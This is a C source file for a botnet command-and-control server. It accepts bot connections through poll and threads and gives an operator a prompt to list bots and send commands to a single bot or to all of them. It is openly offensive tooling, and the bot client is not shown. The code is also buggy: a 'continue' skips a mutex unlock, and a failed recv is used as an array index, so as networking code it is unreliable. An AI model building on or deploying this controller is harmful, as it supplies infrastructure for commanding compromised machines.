// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread

/*
Code is void of input sanitation and missing a lot of error checks.
Code does not update array when client disconnects.
Code has no functionality to exit cleanly.
*/

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>

// Function declarations
void* handle_connection(void *arguments);
void* bot_command(void *args_main);
void print_connection(connection client_con, int new_fd);
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size);


// Structure of arguments for use with bot_command and handle_connection functions
struct arguments
{
    int fd_count;
    int listener_fd;
    connection client_con;
    int *fd_size;
    struct pollfd *pfds;
};

static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    connection client_con = bind_socket("127.0.0.1", 8080);

    // Set count for number of assigned file descriptors (current number of connections)
    int fd_count = 0;

    // Allocate initial memory for array based on 5 connections
    int fd_size = 5;
    struct pollfd *pfds = malloc(sizeof(*pfds) * fd_size);

    // Add listener information to array and increment count of assigned file descriptors
    int listener_fd = client_con.sock_fd;
    pfds[0].fd = listener_fd;
    pfds[0].events = POLLIN;
    fd_count++;

    printf("[+] Server awaiting connection...\n");

    // Create structure of arguments and allocate memory based on size of structure
    struct arguments *args;
    args = malloc(sizeof(struct arguments));

    // Assign values to argument struct for use in functions
    args->pfds = pfds;
    args->fd_count = fd_count;
    args->listener_fd = listener_fd;
    args->client_con = client_con;
    args->fd_size = &fd_size;


    pthread_t connection_thread, control_thread;

    // Create 2 threads - one to accept connections and one to control botnet
    pthread_create(&connection_thread, NULL, handle_connection, (void *)args);
    pthread_create(&control_thread, NULL, bot_command, (void *)args);

    // Wait for threads to finish
    pthread_join(connection_thread, NULL);
    pthread_join(control_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
void* handle_connection(void *args_main)
{

    socklen_t client_addr_size;
    int new_fd;
    struct arguments *args = (struct arguments*)args_main;

    while(1)
    {
        // Set lock
        // pthread_mutex_lock(&mutex);

        // Poll the array for events and set .revents
        int rc = poll(args->pfds, args->fd_count, -1);

        // Release lock
        // pthread_mutex_unlock(&mutex);

        // Check return code of poll(). Return error if -1
        if (rc == -1)
        {
            perror("[-] Error poll()");
            exit(1);
        }

        // Run through existing connections and look for data to read
        for (int i = 0; i < args->fd_count; i++)
        {
            // Check if socket is ready to read
            if (args->pfds[i].revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (args->pfds[i].fd == args->listener_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(args->client_con.client_addr);
                    new_fd = accept(args->client_con.sock_fd,
                        (struct sockaddr *)&args->client_con.client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()");
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to array
                        append_pfds(&args->pfds, new_fd, &args->fd_count, args->fd_size);

                        // Release lock
                        pthread_mutex_unlock(&mutex);

                        // Print connection
                        print_connection(args->client_con, new_fd);
                    }
                }
            }
        }
    }
}

// Print IP and FD of new connection
// Should this be removed? Is it necessary and scalable?
void print_connection(connection client_con, int new_fd)
{
    // Retrieve IP address of accepted client
    client_con.sa = (struct sockaddr_in *)&client_con.client_addr;
    struct in_addr ipAddr = client_con.sa->sin_addr;

    char buff[INET_ADDRSTRLEN];

    // Convert client information to readable format and print
    inet_ntop(client_con.client_addr.ss_family, &ipAddr, buff, sizeof(buff));
    printf("[+] Server: got connection from: %s on socket %d\n", buff, new_fd);
}

// Append new connection file descriptor to array
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size)
{
    // Check if array is full and double size if necessary
    if (*fd_size == *fd_count)
    {
        *fd_size *= 2;
        *pfds = realloc(*pfds, sizeof(**pfds) * (*fd_size));
    }

    // Add file descriptor to array and set event to check for read
    (*pfds)[*fd_count].fd = new_fd;
    (*pfds)[*fd_count].events = POLLIN;

    // Increment count of assigned file descriptors
    (*fd_count)++;
}

// User control
// Will - this is where you will implement user interface
void* bot_command(void *args_main)
{
    char data[1024];
    struct arguments *args = (struct arguments*)args_main;


    while(1)
    {
        // Prompt user for input and remove trailing newline
        printf("[+] [show] connections, send to [single] client, send to [all] client or [exit]\n");
        printf(">> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // Display current list of connections
        if (strcmp(data, "show") == 0)
        {
            // Set lock
            pthread_mutex_lock(&mutex);
            if (args->fd_count == 1)
            {
                continue;
            }
            

            // Iterate through array and print client information
            for (int i = 0; i < args->fd_count; i++)
            {
                printf("client %d is on fd %d\n", i, args->pfds[i].fd);
            }

            // Release lock
            pthread_mutex_unlock(&mutex);
        }

        // Send command to ALL connections except listener
        else if (strcmp(data, "all") == 0)
        {

            // Prompt user for input and remove trailing newline
            printf("[+] Enter command: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;

            // Set lock
            pthread_mutex_lock(&mutex);

            // Iterate through array, omitting listener, and send data to each file descriptor
            // Should we thread this? It would "unblock" the terminal if a client fails to send.
            for (int i = 1; i < args->fd_count; i++)
            {
                // Send the data
                send(args->pfds[i].fd, data, sizeof(data), 0);

                // Wait for a response
                char recieved_data[8192];
                int bytes_recv = recv(args->pfds[i].fd, recieved_data, 8192, 0);

                if (bytes_recv == 0)
                {
                    // Oops, our recv call failed.
                    printf("[-] Unable to recieve from Client %d\n", i);
                }

                recieved_data[bytes_recv] = '\0';
                printf("Client %d said: %s\n", i, recieved_data);
            }

            // Release lock
            pthread_mutex_unlock(&mutex);
        }

        // Send command to SINGLE client
        else if (strcmp(data, "single") == 0)
        {

            // Prompt user for input, remove trailing newline and convert input to int
            printf("[+] Enter client: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;
            int num = atoi(data);

            // Prompt user for input and remove trailing newline
            printf("[+] Enter command: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;

            // Set lock
            pthread_mutex_lock(&mutex);

            // Send data to client specified by user input, based on array index
            send(args->pfds[num].fd, data, sizeof(data), 0);

            // Wait for a response
            char recieved_data[8192];
            int bytes_recv = recv(args->pfds[num].fd, recieved_data, 8192, 0);

            if (bytes_recv == 0)
            {
                // Oops, our recv call failed.
                printf("[-] Unable to recieve from Client %d\n", num);
            }
            
            recieved_data[bytes_recv] = '\0';
            printf("Client %d said: %s\n", num, recieved_data);

            // Release lock
            pthread_mutex_unlock(&mutex);
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            printf("Exiting...\n");
            exit(0);
        }
    }
}
